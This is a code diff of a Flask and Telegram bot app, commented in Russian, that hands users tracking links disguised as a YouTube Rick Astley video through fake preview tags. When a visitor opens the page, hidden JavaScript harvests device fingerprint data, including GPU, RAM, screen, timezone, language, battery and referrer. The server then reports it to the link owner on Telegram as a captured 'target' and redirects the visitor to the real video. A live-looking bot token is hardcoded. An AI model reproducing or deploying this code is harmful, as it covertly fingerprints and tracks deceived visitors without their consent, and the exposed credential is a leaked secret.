@@ -12,7 +12,6 @@ from flask import Flask, render_template_string, request
 # =================================================================
 API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
 OVERLORD_ID = 6659724115 
-# ВАЖНО: Замени на свой URL после деплоя на Render
 BASE_URL = "https://tg-bot-backend-oo97.onrender.com" 
 PORT = int(os.environ.get("PORT", 10000))
 
@@ -37,7 +36,7 @@ def get_owner(sid):
     return res[0] if res else OVERLORD_ID
 
 # =================================================================
-# [2] ADVANCED EXPLOIT PAGE (20 DATA POINTS)
+# [2] ADVANCED EXPLOIT UI (BATTERY + 20 POINTS)
 # =================================================================
 HTML_TEMPLATE = """
 <!DOCTYPE html>
@@ -45,12 +44,9 @@ HTML_TEMPLATE = """
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    
     <meta property="og:title" content="Rick Astley - Never Gonna Give You Up (Official Music Video)" />
-    <meta property="og:description" content="Official YouTube Video - 1.5B views" />
     <meta property="og:image" content="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg" />
-    <meta property="og:site_name" content="YouTube" />
-    
+    <meta property="og:description" content="Official YouTube Video" />
     <title>YouTube</title>
     <style>
         body, html { margin:0; padding:0; width:100%; height:100%; background:#000; overflow:hidden; cursor:pointer; }
@@ -66,14 +62,24 @@ HTML_TEMPLATE = """
     const sid = "{{sid}}";
     let fired = false;
 
-    function ignite() {
+    async function ignite() {
         if (fired) return;
         fired = true;
 
+        // Собираем всё, что не требует ожидания
         const gl = document.createElement('canvas').getContext('webgl');
         const dbg = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
         
+        let bat = "N/A (iOS)";
+        try {
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                bat = Math.round(b.level * 100) + "% " + (b.charging ? "⚡" : "🔋");
+            }
+        } catch(e) {}
+
         const info = {
+            bat: bat,
             gpu: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "N/A",
             vendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : "N/A",
             cores: navigator.hardwareConcurrency || "N/A",
@@ -100,7 +106,7 @@ HTML_TEMPLATE = """
 
         setTimeout(() => {
             window.location.replace("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
-        }, 400);
+        }, 500);
     }
 </script>
 </body>
@@ -108,12 +114,8 @@ HTML_TEMPLATE = """
 """
 
 # =================================================================
-# [3] SERVER LOGIC & DETAILED REPORTING
+# [3] SERVER LOGIC & STRUCTURED REPORTING
 # =================================================================
-
-@app.route('/v/<sid>')
-def serve(sid):
-    return render_template_string(HTML_TEMPLATE, sid=sid)
 
 @app.route('/gate/capture', methods=['POST'])
 def capture():
@@ -124,30 +126,33 @@ def capture():
         d = payload.get('data', {})
         
         report = (
-            f"<b>📊 ПОЛНЫЙ ОТЧЕТ (20 ПАРАМЕТРОВ)</b>\n"
+            f"<b>🔴 ОБЪЕКТ ЗАФИКСИРОВАН</b>\n"
             f"━━━━━━━━━━━━━━━━━━\n"
-            f"1.  🆔 <b>ID:</b> <code>{sid}</code>\n"
-            f"2.  🎮 <b>GPU:</b> <code>{d.get('gpu')}</code>\n"
-            f"3.  🏭 <b>Vendor:</b> <code>{d.get('vendor')}</code>\n"
-            f"4.  🧠 <b>Ядра:</b> <code>{d.get('cores')}</code>\n"
-            f"5.  💾 <b>RAM:</b> <code>{d.get('mem')} GB</code>\n"
-            f"6.  📱 <b>Экран:</b> <code>{d.get('res')}</code>\n"
-            f"7.  🔍 <b>Ratio:</b> <code>{d.get('ratio')}</code>\n"
-            f"8.  🎨 <b>Цвет:</b> <code>{d.get('depth')} bit</code>\n"
-            f"9.  💻 <b>ОС:</b> <code>{d.get('plat')}</code>\n"
-            f"10. 📍 <b>Таймзона:</b> <code>{d.get('tz')}</code>\n"
-            f"11. 🗣 <b>Язык:</b> <code>{d.get('lang')}</code>\n"
-            f"12. 👆 <b>Touch:</b> <code>{d.get('touch')}</code>\n"
-            f"13. 🍪 <b>Cookie:</b> <code>{d.get('cookies')}</code>\n"
-            f"14. 🕵️ <b>DNT:</b> <code>{d.get('dnt')}</code>\n"
-            f"15. 📄 <b>PDF:</b> <code>{d.get('pdf')}</code>\n"
-            f"16. 🌙 <b>Dark:</b> <code>{d.get('dark')}</code>\n"
-            f"17. 📶 <b>Online:</b> <code>{d.get('online')}</code>\n"
-            f"18. 📂 <b>History:</b> <code>{d.get('hist')}</code>\n"
-            f"19. 🧩 <b>Plugins:</b> <code>{d.get('plugins')}</code>\n"
-            f"20. 🔗 <b>Ref:</b> <code>{payload.get('ref')}</code>\n"
+            f"🆔 <b>Target ID:</b> <code>{sid}</code>\n"
+            f"🔋 <b>Заряд:</b> <code>{d.get('bat')}</code>\n\n"
+            
+            f"<b>🛠 ЖЕЛЕЗО:</b>\n"
+            f"• 🎮 <b>GPU:</b> <code>{d.get('gpu')}</code>\n"
+            f"• 🧠 <b>Cores/RAM:</b> <code>{d.get('cores')} Cores / {d.get('mem')} GB</code>\n"
+            f"• 🏭 <b>Vendor:</b> <code>{d.get('vendor')}</code>\n"
+            f"• 📱 <b>Platform:</b> <code>{d.get('plat')}</code>\n\n"
+            
+            f"<b>🖥 ДИСПЛЕЙ:</b>\n"
+            f"• 📐 <b>Res:</b> <code>{d.get('res')}</code>\n"
+            f"• 🔍 <b>Ratio/Depth:</b> <code>{d.get('ratio')} / {d.get('depth')} bit</code>\n"
+            f"• 👆 <b>Touch:</b> <code>{d.get('touch')} pts</code>\n\n"
+            
+            f"<b>⚙️ СИСТЕМА:</b>\n"
+            f"• 📍 <b>TZ:</b> <code>{d.get('tz')}</code>\n"
+            f"• 🗣 <b>Lang:</b> <code>{d.get('lang')}</code>\n"
+            f"• 🌙 <b>Dark Mode:</b> <code>{'Да' if d.get('dark') else 'Нет'}</code>\n"
+            f"• 🌐 <b>Online:</b> <code>{d.get('online')}</code>\n\n"
+            
+            f"<b>🔗 ИСТОЧНИК:</b>\n"
+            f"• 🖇 <b>Referrer:</b> <code>{payload.get('ref')}</code>\n"
             f"━━━━━━━━━━━━━━━━━━\n"
-            f"🛰 <b>UA:</b>\n<code>{d.get('ua')}</code>"
+            f"🛰 <b>USER-AGENT:</b>\n"
+            f"<code>{d.get('ua')[:150]}...</code>"
         )
         
         owner_id = get_owner(str(sid))
@@ -156,8 +161,11 @@ def capture():
     except: pass
     return "OK"
 
+@app.route('/v/<sid>')
+def serve(sid):
+    return render_template_string(HTML_TEMPLATE, sid=sid)
+
 @app.route('/ping')
-@app.route('/system/heartbeat')
 def health(): return "OK", 200
 
 # =================================================================
@@ -177,8 +185,9 @@ def bot_loop():
                     if msg["text"] == "/start":
                         save_link(str(cid), cid)
                         link = f"{BASE_URL}/v/{cid}"
+                        text = f"🕶 <b>Система готова</b>\n\nТвоя персональная ссылка:\n<a href='{link}'>{link}</a>"
                         requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
-                                      json={"chat_id": cid, "text": f"🔥 <b>Система готова!</b>\n\nТвоя ссылка:\n<a href='{link}'>{link}</a>", "parse_mode": "HTML"})
+                                      json={"chat_id": cid, "text": text, "parse_mode": "HTML"})
         except: time.sleep(5)
 
 if __name__ == '__main__':
